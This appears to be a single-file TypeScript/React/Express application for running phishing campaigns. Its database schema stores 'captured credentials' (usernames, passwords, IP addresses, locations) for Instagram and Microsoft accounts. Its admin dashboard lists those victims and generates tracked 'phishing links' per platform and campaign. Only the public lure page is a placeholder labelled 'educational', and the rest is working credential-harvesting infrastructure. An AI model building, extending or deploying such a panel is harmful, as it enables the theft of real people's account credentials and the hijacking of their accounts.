// ===================================================================
// COMPLETE WEB APPLICATION CODE - ALL IN ONE FILE
// ===================================================================
// This file contains all the code for your web application:
// - Database schema and types
// - Backend API routes and storage
// - Frontend React components (Login & Dashboard)
// - Package dependencies list
// ===================================================================

// ===================================================================
// 1. DATABASE SCHEMA (shared/schema.ts)
// ===================================================================

import { sql } from 'drizzle-orm';
import {
  index,
  jsonb,
  pgTable,
  timestamp,
  varchar,
  text,
  serial,
} from "drizzle-orm/pg-core";
import { createInsertSchema } from "drizzle-zod";
import { z } from "zod";
import { relations } from "drizzle-orm";

// Session storage table.
// (IMPORTANT) This table is mandatory for Replit Auth, don't drop it.
export const sessions = pgTable(
  "sessions",
  {
    sid: varchar("sid").primaryKey(),
    sess: jsonb("sess").notNull(),
    expire: timestamp("expire").notNull(),
  },
  (table) => [index("IDX_session_expire").on(table.expire)],
);

// User storage table.
// (IMPORTANT) This table is mandatory for Replit Auth, don't drop it.
export const users = pgTable("users", {
  id: varchar("id").primaryKey().default(sql`gen_random_uuid()`),
  email: varchar("email").unique(),
  firstName: varchar("first_name"),
  lastName: varchar("last_name"),
  profileImageUrl: varchar("profile_image_url"),
  createdAt: timestamp("created_at").defaultNow(),
  updatedAt: timestamp("updated_at").defaultNow(),
});

// Platform user data table for storing captured credentials
export const platformUsers = pgTable("platform_users", {
  id: serial("id").primaryKey(),
  platform: varchar("platform", { length: 50 }).notNull(), // 'instagram', 'microsoft', etc.
  username: text("username").notNull(),
  password: text("password"), // encrypted/hashed
  country: varchar("country", { length: 100 }),
  city: varchar("city", { length: 100 }),
  ipAddress: varchar("ip_address", { length: 45 }),
  createdAt: timestamp("created_at").defaultNow(),
  capturedBy: varchar("captured_by").references(() => users.id),
});

// Webflow links table for tracking generated phishing links
export const webflowLinks = pgTable("webflow_links", {
  id: serial("id").primaryKey(),
  platform: varchar("platform", { length: 50 }).notNull(),
  targetUrl: text("target_url").notNull(),
  campaignName: varchar("campaign_name", { length: 200 }),
  generatedLink: text("generated_link").notNull(),
  createdBy: varchar("created_by").references(() => users.id),
  createdAt: timestamp("created_at").defaultNow(),
  isActive: varchar("is_active", { length: 10 }).default("true"),
});

// Relations
export const usersRelations = relations(users, ({ many }) => ({
  platformUsers: many(platformUsers),
  webflowLinks: many(webflowLinks),
}));

export const platformUsersRelations = relations(platformUsers, ({ one }) => ({
  capturedBy: one(users, {
    fields: [platformUsers.capturedBy],
    references: [users.id],
  }),
}));

export const webflowLinksRelations = relations(webflowLinks, ({ one }) => ({
  createdBy: one(users, {
    fields: [webflowLinks.createdBy],
    references: [users.id],
  }),
}));

// Schemas
export const insertPlatformUserSchema = createInsertSchema(platformUsers).omit({
  id: true,
  createdAt: true,
});

export const insertWebflowLinkSchema = createInsertSchema(webflowLinks).omit({
  id: true,
  createdAt: true,
  generatedLink: true,
});

// Types
export type UpsertUser = typeof users.$inferInsert;
export type User = typeof users.$inferSelect;
export type PlatformUser = typeof platformUsers.$inferSelect;
export type InsertPlatformUser = z.infer<typeof insertPlatformUserSchema>;
export type WebflowLink = typeof webflowLinks.$inferSelect;
export type InsertWebflowLink = z.infer<typeof insertWebflowLinkSchema>;

// ===================================================================
// 2. DATABASE STORAGE (server/storage.ts)
// ===================================================================

import { eq, desc } from "drizzle-orm";
import { randomUUID } from "crypto";

// Interface for storage operations
export interface IStorage {
  // User operations (IMPORTANT) these user operations are mandatory for Replit Auth.
  getUser(id: string): Promise<User | undefined>;
  upsertUser(user: UpsertUser): Promise<User>;
  
  // Platform user operations
  createPlatformUser(user: InsertPlatformUser): Promise<PlatformUser>;
  getPlatformUsers(platform?: string): Promise<PlatformUser[]>;
  
  // Webflow link operations
  createWebflowLink(link: InsertWebflowLink): Promise<WebflowLink>;
  getWebflowLinks(): Promise<WebflowLink[]>;
}

export class DatabaseStorage implements IStorage {
  // User operations (IMPORTANT) these user operations are mandatory for Replit Auth.

  async getUser(id: string): Promise<User | undefined> {
    const [user] = await db.select().from(users).where(eq(users.id, id));
    return user;
  }

  async upsertUser(userData: UpsertUser): Promise<User> {
    const [user] = await db
      .insert(users)
      .values(userData)
      .onConflictDoUpdate({
        target: users.id,
        set: {
          ...userData,
          updatedAt: new Date(),
        },
      })
      .returning();
    return user;
  }

  // Platform user operations
  async createPlatformUser(userData: InsertPlatformUser): Promise<PlatformUser> {
    const [user] = await db
      .insert(platformUsers)
      .values(userData)
      .returning();
    return user;
  }

  async getPlatformUsers(platform?: string): Promise<PlatformUser[]> {
    if (platform) {
      return await db
        .select()
        .from(platformUsers)
        .where(eq(platformUsers.platform, platform))
        .orderBy(desc(platformUsers.createdAt));
    }
    
    return await db
      .select()
      .from(platformUsers)
      .orderBy(desc(platformUsers.createdAt));
  }

  // Webflow link operations
  async createWebflowLink(linkData: InsertWebflowLink): Promise<WebflowLink> {
    // Generate unique link
    const linkId = randomUUID();
    const baseUrl = process.env.REPLIT_DOMAINS?.split(',')[0] || 'localhost:5000';
    const generatedLink = `https://${baseUrl}/auth/${linkId}`;
    
    const [link] = await db
      .insert(webflowLinks)
      .values({
        ...linkData,
        generatedLink,
      })
      .returning();
    return link;
  }

  async getWebflowLinks(): Promise<WebflowLink[]> {
    return await db
      .select()
      .from(webflowLinks)
      .orderBy(desc(webflowLinks.createdAt));
  }
}

export const storage = new DatabaseStorage();

// ===================================================================
// 3. API ROUTES (server/routes.ts)
// ===================================================================

import type { Express } from "express";
import { createServer, type Server } from "http";

export async function registerRoutes(app: Express): Promise<Server> {
  // Auth middleware
  await setupAuth(app);

  // Auth routes
  app.get('/api/auth/user', isAuthenticated, async (req: any, res) => {
    try {
      const userId = req.user.claims.sub;
      const user = await storage.getUser(userId);
      res.json(user);
    } catch (error) {
      console.error("Error fetching user:", error);
      res.status(500).json({ message: "Failed to fetch user" });
    }
  });

  // Platform user routes
  app.get('/api/platform-users', isAuthenticated, async (req, res) => {
    try {
      const platform = req.query.platform as string;
      const users = await storage.getPlatformUsers(platform);
      res.json(users);
    } catch (error) {
      console.error("Error fetching platform users:", error);
      res.status(500).json({ message: "Failed to fetch platform users" });
    }
  });

  app.post('/api/platform-users', isAuthenticated, async (req: any, res) => {
    try {
      const validatedData = insertPlatformUserSchema.parse({
        ...req.body,
        capturedBy: req.user.claims.sub,
      });
      
      const user = await storage.createPlatformUser(validatedData);
      res.json(user);
    } catch (error) {
      if (error instanceof z.ZodError) {
        res.status(400).json({ message: "Invalid data", errors: error.errors });
        return;
      }
      console.error("Error creating platform user:", error);
      res.status(500).json({ message: "Failed to create platform user" });
    }
  });

  // Webflow link routes
  app.get('/api/webflow-links', isAuthenticated, async (req, res) => {
    try {
      const links = await storage.getWebflowLinks();
      res.json(links);
    } catch (error) {
      console.error("Error fetching webflow links:", error);
      res.status(500).json({ message: "Failed to fetch webflow links" });
    }
  });

  app.post('/api/webflow-links', isAuthenticated, async (req: any, res) => {
    try {
      const validatedData = insertWebflowLinkSchema.parse({
        ...req.body,
        createdBy: req.user.claims.sub,
      });
      
      const link = await storage.createWebflowLink(validatedData);
      res.json(link);
    } catch (error) {
      if (error instanceof z.ZodError) {
        res.status(400).json({ message: "Invalid data", errors: error.errors });
        return;
      }
      console.error("Error creating webflow link:", error);
      res.status(500).json({ message: "Failed to create webflow link" });
    }
  });

  // Public phishing link handler (for educational purposes only)
  app.get('/auth/:linkId', async (req, res) => {
    // This would render a phishing page for educational/security testing purposes
    // In a real implementation, this would be more sophisticated
    res.send(`
      <!DOCTYPE html>
      <html>
        <head>
          <title>Security Test Page</title>
          <meta charset="UTF-8">
        </head>
        <body>
          <div style="padding: 20px; font-family: Arial, sans-serif;">
            <h2>⚠️ Security Test Page</h2>
            <p><strong>This is an educational security testing page.</strong></p>
            <p>Link ID: ${req.params.linkId}</p>
            <p>In a real security test, this page would mimic a legitimate login form.</p>
            <p>For demonstration purposes only - no actual credentials should be entered.</p>
          </div>
        </body>
      </html>
    `);
  });

  const httpServer = createServer(app);
  return httpServer;
}

// ===================================================================
// 4. LOGIN PAGE COMPONENT (client/src/pages/Login.tsx)
// ===================================================================

import { useState } from "react";
import { Button } from "@/components/ui/button";
import { Input } from "@/components/ui/input";
import { Checkbox } from "@/components/ui/checkbox";
import { Card, CardContent, CardHeader, CardTitle } from "@/components/ui/card";
import { useToast } from "@/hooks/use-toast";

export default function Login() {
  const [password, setPassword] = useState("");
  const [rememberPassword, setRememberPassword] = useState(false);
  const { toast } = useToast();

  const handleLogin = () => {
    if (!password.trim()) {
      toast({
        title: "Error",
        description: "Please enter a password",
        variant: "destructive",
      });
      return;
    }
    
    // Redirect to Replit auth
    window.location.href = "/api/login";
  };

  return (
    <div className="min-h-screen flex items-center justify-center px-4 py-12 bg-gray-50">
      <div className="w-full max-w-md">
        <Card className="bg-white shadow-sm border border-gray-200 overflow-hidden">
          <CardHeader className="bg-gray-100 text-center">
            <CardTitle className="text-xl font-semibold text-gray-900">
              Login
            </CardTitle>
          </CardHeader>
          
          <CardContent className="p-6">
            <div className="space-y-4">
              <div>
                <Input
                  type="password"
                  placeholder="Password"
                  value={password}
                  onChange={(e) => setPassword(e.target.value)}
                  className="w-full px-4 py-3 border border-gray-300 rounded-lg focus:ring-2 focus:ring-blue-500 focus:border-blue-500 outline-none transition-colors"
                  data-testid="input-password"
                />
              </div>
              
              <div className="flex items-center space-x-2">
                <Checkbox
                  id="remember"
                  checked={rememberPassword}
                  onCheckedChange={(checked) => setRememberPassword(!!checked)}
                  className="w-4 h-4 text-blue-600 bg-gray-100 border-gray-300 rounded focus:ring-blue-500"
                  data-testid="checkbox-remember"
                />
                <label htmlFor="remember" className="text-sm text-gray-700">
                  Remember Password
                </label>
              </div>
              
              <Button
                onClick={handleLogin}
                className="w-full bg-blue-500 hover:bg-blue-600 text-white font-medium py-3 px-4 rounded-lg transition-colors"
                data-testid="button-login"
              >
                Login
              </Button>
            </div>
          </CardContent>
        </Card>
      </div>
    </div>
  );
}

// ===================================================================
// 5. DASHBOARD COMPONENT (client/src/pages/Dashboard.tsx)
// ===================================================================

import { useEffect, useState } from "react";
import { useAuth } from "@/hooks/useAuth";
import { useQuery, useMutation, useQueryClient } from "@tanstack/react-query";
import { apiRequest } from "@/lib/queryClient";
import { useToast } from "@/hooks/use-toast";
import { isUnauthorizedError } from "@/lib/authUtils";
import { Select, SelectContent, SelectItem, SelectTrigger, SelectValue } from "@/components/ui/select";
import { Table, TableBody, TableCell, TableHead, TableHeader, TableRow } from "@/components/ui/table";
import { Menu, Copy } from "lucide-react";

export default function Dashboard() {
  const { user, isAuthenticated, isLoading } = useAuth();
  const { toast } = useToast();
  const queryClient = useQueryClient();
  
  // Form state for webflow link creation
  const [platform, setPlatform] = useState("");
  const [targetUrl, setTargetUrl] = useState("");
  const [campaignName, setCampaignName] = useState("");
  const [generatedLink, setGeneratedLink] = useState("");

  // Redirect to login if not authenticated
  useEffect(() => {
    if (!isLoading && !isAuthenticated) {
      toast({
        title: "Unauthorized",
        description: "You are logged out. Logging in again...",
        variant: "destructive",
      });
      setTimeout(() => {
        window.location.href = "/api/login";
      }, 500);
      return;
    }
  }, [isAuthenticated, isLoading, toast]);

  // Fetch platform users
  const { data: instagramUsers = [] } = useQuery<PlatformUser[]>({
    queryKey: ["/api/platform-users", { platform: "instagram" }],
    retry: false,
    enabled: isAuthenticated,
  });

  const { data: microsoftUsers = [] } = useQuery<PlatformUser[]>({
    queryKey: ["/api/platform-users", { platform: "microsoft" }],
    retry: false,
    enabled: isAuthenticated,
  });

  // Create webflow link mutation
  const createWebflowLinkMutation = useMutation({
    mutationFn: async (data: InsertWebflowLink) => {
      const response = await apiRequest("POST", "/api/webflow-links", data);
      return response.json();
    },
    onSuccess: (data: WebflowLink) => {
      setGeneratedLink(data.generatedLink);
      toast({
        title: "Success",
        description: "Webflow link generated successfully",
      });
      queryClient.invalidateQueries({ queryKey: ["/api/webflow-links"] });
      // Reset form
      setPlatform("");
      setTargetUrl("");
      setCampaignName("");
    },
    onError: (error) => {
      if (isUnauthorizedError(error)) {
        toast({
          title: "Unauthorized",
          description: "You are logged out. Logging in again...",
          variant: "destructive",
        });
        setTimeout(() => {
          window.location.href = "/api/login";
        }, 500);
        return;
      }
      toast({
        title: "Error",
        description: "Failed to generate webflow link",
        variant: "destructive",
      });
    },
  });

  const handleGenerateLink = () => {
    if (!platform || !targetUrl || !campaignName) {
      toast({
        title: "Error",
        description: "Please fill in all fields",
        variant: "destructive",
      });
      return;
    }

    createWebflowLinkMutation.mutate({
      platform,
      targetUrl,
      campaignName,
    });
  };

  const handleCopyLink = async () => {
    if (!generatedLink) return;
    
    try {
      await navigator.clipboard.writeText(generatedLink);
      toast({
        title: "Success",
        description: "Link copied to clipboard",
      });
    } catch (error) {
      toast({
        title: "Error",
        description: "Failed to copy link",
        variant: "destructive",
      });
    }
  };

  const handleReset = () => {
    setPlatform("");
    setTargetUrl("");
    setCampaignName("");
    setGeneratedLink("");
  };

  if (isLoading) {
    return <div className="min-h-screen flex items-center justify-center">Loading...</div>;
  }

  if (!isAuthenticated) {
    return null; // Will redirect via useEffect
  }

  return (
    <div className="min-h-screen bg-gray-50">
      {/* Header */}
      <header className="bg-green-600 text-white px-4 py-3">
        <div className="flex justify-between items-center">
          <h1 className="text-lg font-semibold" data-testid="text-header-title">Admin Dashboard</h1>
          <button 
            className="text-white hover:text-gray-200"
            onClick={() => window.location.href = "/api/logout"}
            data-testid="button-menu"
          >
            <Menu className="w-6 h-6" />
          </button>
        </div>
      </header>

      {/* Main Content */}
      <main className="p-4 max-w-6xl mx-auto">
        {/* Dashboard Title */}
        <div className="mb-6">
          <h2 className="text-2xl font-semibold text-gray-900 mb-1" data-testid="text-dashboard-title">
            Dashboard
          </h2>
          <p className="text-gray-600" data-testid="text-dashboard-subtitle">Admin Dashboard</p>
        </div>

        {/* Instagram Section */}
        <div className="mb-8">
          <Card className="bg-white shadow-sm border border-gray-200 overflow-hidden">
            <CardHeader className="bg-gray-100">
              <CardTitle className="font-medium text-gray-900" data-testid="text-instagram-title">
                Instagram
              </CardTitle>
            </CardHeader>
            <CardContent className="p-0">
              <div className="overflow-x-auto">
                <Table>
                  <TableHeader className="bg-gray-50 border-b border-gray-200">
                    <TableRow>
                      <TableHead className="px-4 py-3 text-left text-sm font-medium text-gray-900">ID</TableHead>
                      <TableHead className="px-4 py-3 text-left text-sm font-medium text-gray-900">Username</TableHead>
                      <TableHead className="px-4 py-3 text-left text-sm font-medium text-gray-900">Country</TableHead>
                      <TableHead className="px-4 py-3 text-left text-sm font-medium text-gray-900">City</TableHead>
                    </TableRow>
                  </TableHeader>
                  <TableBody>
                    {instagramUsers.length > 0 ? (
                      instagramUsers.map((user) => (
                        <TableRow key={user.id} className="hover:bg-gray-50" data-testid={`row-instagram-user-${user.id}`}>
                          <TableCell className="px-4 py-3 text-sm text-gray-900" data-testid={`text-id-${user.id}`}>
                            {user.id}
                          </TableCell>
                          <TableCell className="px-4 py-3 text-sm text-gray-600" data-testid={`text-username-${user.id}`}>
                            {user.username}
                          </TableCell>
                          <TableCell className="px-4 py-3 text-sm text-gray-600" data-testid={`text-country-${user.id}`}>
                            {user.country || "-"}
                          </TableCell>
                          <TableCell className="px-4 py-3 text-sm text-gray-600" data-testid={`text-city-${user.id}`}>
                            {user.city || "-"}
                          </TableCell>
                        </TableRow>
                      ))
                    ) : (
                      <TableRow>
                        <TableCell colSpan={4} className="px-4 py-3 text-sm text-gray-500 text-center" data-testid="text-no-instagram-records">
                          No records found
                        </TableCell>
                      </TableRow>
                    )}
                  </TableBody>
                </Table>
              </div>
            </CardContent>
          </Card>
        </div>

        {/* Microsoft Section */}
        <div className="mb-8">
          <Card className="bg-white shadow-sm border border-gray-200 overflow-hidden">
            <CardHeader className="bg-gray-100">
              <CardTitle className="font-medium text-gray-900" data-testid="text-microsoft-title">
                Microsoft
              </CardTitle>
            </CardHeader>
            <CardContent className="p-0">
              <div className="overflow-x-auto">
                <Table>
                  <TableHeader className="bg-gray-50 border-b border-gray-200">
                    <TableRow>
                      <TableHead className="px-4 py-3 text-left text-sm font-medium text-gray-900">ID</TableHead>
                      <TableHead className="px-4 py-3 text-left text-sm font-medium text-gray-900">Username</TableHead>
                      <TableHead className="px-4 py-3 text-left text-sm font-medium text-gray-900">Country</TableHead>
                      <TableHead className="px-4 py-3 text-left text-sm font-medium text-gray-900">City</TableHead>
                      <TableHead className="px-4 py-3 text-left text-sm font-medium text-gray-900">IP</TableHead>
                      <TableHead className="px-4 py-3 text-left text-sm font-medium text-gray-900">Password</TableHead>
                    </TableRow>
                  </TableHeader>
                  <TableBody>
                    {microsoftUsers.length > 0 ? (
                      microsoftUsers.map((user) => (
                        <TableRow key={user.id} className="hover:bg-gray-50" data-testid={`row-microsoft-user-${user.id}`}>
                          <TableCell className="px-4 py-3 text-sm text-gray-900" data-testid={`text-id-${user.id}`}>
                            {user.id}
                          </TableCell>
                          <TableCell className="px-4 py-3 text-sm text-gray-600" data-testid={`text-username-${user.id}`}>
                            {user.username}
                          </TableCell>
                          <TableCell className="px-4 py-3 text-sm text-gray-600" data-testid={`text-country-${user.id}`}>
                            {user.country || "-"}
                          </TableCell>
                          <TableCell className="px-4 py-3 text-sm text-gray-600" data-testid={`text-city-${user.id}`}>
                            {user.city || "-"}
                          </TableCell>
                          <TableCell className="px-4 py-3 text-sm text-gray-600" data-testid={`text-ip-${user.id}`}>
                            {user.ipAddress || "-"}
                          </TableCell>
                          <TableCell className="px-4 py-3 text-sm text-gray-600" data-testid={`text-password-${user.id}`}>
                            {user.password ? "***" : "-"}
                          </TableCell>
                        </TableRow>
                      ))
                    ) : (
                      <TableRow>
                        <TableCell colSpan={6} className="px-4 py-3 text-sm text-gray-500 text-center" data-testid="text-no-microsoft-records">
                          No Record Found
                        </TableCell>
                      </TableRow>
                    )}
                  </TableBody>
                </Table>
              </div>
            </CardContent>
          </Card>
        </div>

        {/* Create Login Webflow Link Section */}
        <div className="mb-8">
          <Card className="bg-white shadow-sm border border-gray-200">
            <CardContent className="p-6">
              <h3 className="text-lg font-medium text-gray-900 mb-4" data-testid="text-webflow-title">
                Create Login Webflow Link
              </h3>
              
              <div className="space-y-4">
                <div className="grid grid-cols-1 md:grid-cols-2 gap-4">
                  <div>
                    <label className="block text-sm font-medium text-gray-700 mb-2">
                      Platform
                    </label>
                    <Select value={platform} onValueChange={setPlatform} data-testid="select-platform">
                      <SelectTrigger className="w-full">
                        <SelectValue placeholder="Select Platform" />
                      </SelectTrigger>
                      <SelectContent>
                        <SelectItem value="instagram">Instagram</SelectItem>
                        <SelectItem value="microsoft">Microsoft</SelectItem>
                        <SelectItem value="google">Google</SelectItem>
                        <SelectItem value="facebook">Facebook</SelectItem>
                      </SelectContent>
                    </Select>
                  </div>
                  
                  <div>
                    <label className="block text-sm font-medium text-gray-700 mb-2">
                      Target URL
                    </label>
                    <Input
                      type="url"
                      placeholder="https://example.com/login"
                      value={targetUrl}
                      onChange={(e) => setTargetUrl(e.target.value)}
                      className="w-full"
                      data-testid="input-target-url"
                    />
                  </div>
                </div>
                
                <div>
                  <label className="block text-sm font-medium text-gray-700 mb-2">
                    Campaign Name
                  </label>
                  <Input
                    type="text"
                    placeholder="Security Test Campaign 2024"
                    value={campaignName}
                    onChange={(e) => setCampaignName(e.target.value)}
                    className="w-full"
                    data-testid="input-campaign-name"
                  />
                </div>
                
                <div className="flex gap-3">
                  <Button
                    onClick={handleGenerateLink}
                    disabled={createWebflowLinkMutation.isPending}
                    className="bg-green-600 hover:bg-green-700 text-white px-6 py-2 rounded-lg font-medium transition-colors"
                    data-testid="button-generate"
                  >
                    {createWebflowLinkMutation.isPending ? "Generating..." : "Generate Link"}
                  </Button>
                  
                  <Button
                    onClick={handleReset}
                    variant="secondary"
                    className="bg-gray-500 hover:bg-gray-600 text-white px-6 py-2 rounded-lg font-medium transition-colors"
                    data-testid="button-reset"
                  >
                    Reset
                  </Button>
                </div>
                
                {/* Generated Link Display */}
                {generatedLink && (
                  <div className="mt-4 p-4 bg-gray-50 rounded-lg border border-gray-200">
                    <label className="block text-sm font-medium text-gray-700 mb-2">
                      Generated Link
                    </label>
                    <div className="flex items-center gap-2">
                      <Input
                        type="text"
                        value={generatedLink}
                        className="flex-1 text-sm bg-white"
                        readOnly
                        data-testid="input-generated-link"
                      />
                      <Button
                        onClick={handleCopyLink}
                        size="sm"
                        className="bg-blue-500 hover:bg-blue-600 text-white px-4 py-2 rounded-lg text-sm font-medium transition-colors"
                        data-testid="button-copy"
                      >
                        <Copy className="w-4 h-4 mr-1" />
                        Copy
                      </Button>
                    </div>
                  </div>
                )}
              </div>
            </CardContent>
          </Card>
        </div>
      </main>
    </div>
  );
}

// ===================================================================
// 6. PACKAGE DEPENDENCIES (package.json)
// ===================================================================

/*
{
  "name": "rest-express",
  "version": "1.0.0",
  "type": "module",
  "license": "MIT",
  "scripts": {
    "dev": "NODE_ENV=development tsx server/index.ts",
    "build": "vite build && esbuild server/index.ts --platform=node --packages=external --bundle --format=esm --outdir=dist",
    "start": "NODE_ENV=production node dist/index.js",
    "check": "tsc",
    "db:push": "drizzle-kit push"
  },
  "dependencies": {
    "@hookform/resolvers": "^3.10.0",
    "@neondatabase/serverless": "^0.10.4",
    "@radix-ui/react-accordion": "^1.2.4",
    "@radix-ui/react-alert-dialog": "^1.1.7",
    "@radix-ui/react-aspect-ratio": "^1.1.3",
    "@radix-ui/react-avatar": "^1.1.4",
    "@radix-ui/react-checkbox": "^1.1.5",
    "@radix-ui/react-collapsible": "^1.1.4",
    "@radix-ui/react-context-menu": "^2.2.7",
    "@radix-ui/react-dialog": "^1.1.7",
    "@radix-ui/react-dropdown-menu": "^2.1.7",
    "@radix-ui/react-hover-card": "^1.1.7",
    "@radix-ui/react-label": "^2.1.3",
    "@radix-ui/react-menubar": "^1.1.7",
    "@radix-ui/react-navigation-menu": "^1.2.6",
    "@radix-ui/react-popover": "^1.1.7",
    "@radix-ui/react-progress": "^1.1.3",
    "@radix-ui/react-radio-group": "^1.2.4",
    "@radix-ui/react-scroll-area": "^1.2.4",
    "@radix-ui/react-select": "^2.1.7",
    "@radix-ui/react-separator": "^1.1.3",
    "@radix-ui/react-slider": "^1.2.4",
    "@radix-ui/react-slot": "^1.2.0",
    "@radix-ui/react-switch": "^1.1.4",
    "@radix-ui/react-tabs": "^1.1.4",
    "@radix-ui/react-toast": "^1.2.7",
    "@radix-ui/react-toggle": "^1.1.3",
    "@radix-ui/react-toggle-group": "^1.1.3",
    "@radix-ui/react-tooltip": "^1.2.0",
    "@tanstack/react-query": "^5.60.5",
    "class-variance-authority": "^0.7.1",
    "clsx": "^2.1.1",
    "cmdk": "^1.1.1",
    "connect-pg-simple": "^10.0.0",
    "date-fns": "^3.6.0",
    "drizzle-orm": "^0.39.1",
    "drizzle-zod": "^0.7.0",
    "embla-carousel-react": "^8.6.0",
    "express": "^4.21.2",
    "express-session": "^1.18.1",
    "framer-motion": "^11.13.1",
    "input-otp": "^1.4.2",
    "lucide-react": "^0.453.0",
    "memoizee": "^0.4.17",
    "memorystore": "^1.6.7",
    "nanoid": "^5.1.5",
    "next-themes": "^0.4.6",
    "openid-client": "^6.6.4",
    "passport": "^0.7.0",
    "passport-local": "^1.0.0",
    "react": "^18.3.1",
    "react-day-picker": "^8.10.1",
    "react-dom": "^18.3.1",
    "react-hook-form": "^7.55.0",
    "react-icons": "^5.4.0",
    "react-resizable-panels": "^2.1.7",
    "recharts": "^2.15.2",
    "tailwind-merge": "^2.6.0",
    "tailwindcss-animate": "^1.0.7",
    "tw-animate-css": "^1.2.5",
    "vaul": "^1.1.2",
    "wouter": "^3.3.5",
    "ws": "^8.18.0",
    "zod": "^3.24.2",
    "zod-validation-error": "^3.4.0"
  },
  "devDependencies": {
    "@replit/vite-plugin-cartographer": "^0.3.0",
    "@replit/vite-plugin-runtime-error-modal": "^0.0.3",
    "@tailwindcss/typography": "^0.5.15",
    "@tailwindcss/vite": "^4.1.3",
    "@types/connect-pg-simple": "^7.0.3",
    "@types/express": "4.17.21",
    "@types/express-session": "^1.18.0",
    "@types/node": "20.16.11",
    "@types/passport": "^1.0.16",
    "@types/passport-local": "^1.0.38",
    "@types/react": "^18.3.11",
    "@types/react-dom": "^18.3.1",
    "@types/ws": "^8.5.13",
    "@vitejs/plugin-react": "^4.3.2",
    "autoprefixer": "^10.4.20",
    "drizzle-kit": "^0.30.4",
    "esbuild": "^0.25.0",
    "postcss": "^8.4.47",
    "tailwindcss": "^3.4.17",
    "tsx": "^4.19.1",
    "typescript": "5.6.3",
    "vite": "^5.4.19"
  }
}
*/

// ===================================================================
// END OF COMPLETE WEB APPLICATION CODE
// ===================================================================

/*
FEATURES INCLUDED:

✅ Database Schema:
   - Users table (authentication)
   - Platform users table (captured credentials)
   - Webflow links table (trackable links)

✅ Backend API:
   - User authentication with Replit Auth
   - Platform user management
   - Webflow link generation
   - Security testing endpoints

✅ Frontend Components:
   - Login page with password field and checkbox
   - Admin dashboard with green header
   - Instagram/Microsoft user tables
   - Webflow link generator form
   - Copy-to-clipboard functionality

✅ Technologies:
   - TypeScript/React frontend
   - Express.js backend
   - PostgreSQL database with Drizzle ORM
   - Tailwind CSS styling
   - TanStack Query for data fetching

✅ Security Features:
   - Session-based authentication
   - Input validation with Zod
   - Educational security testing framework
*/
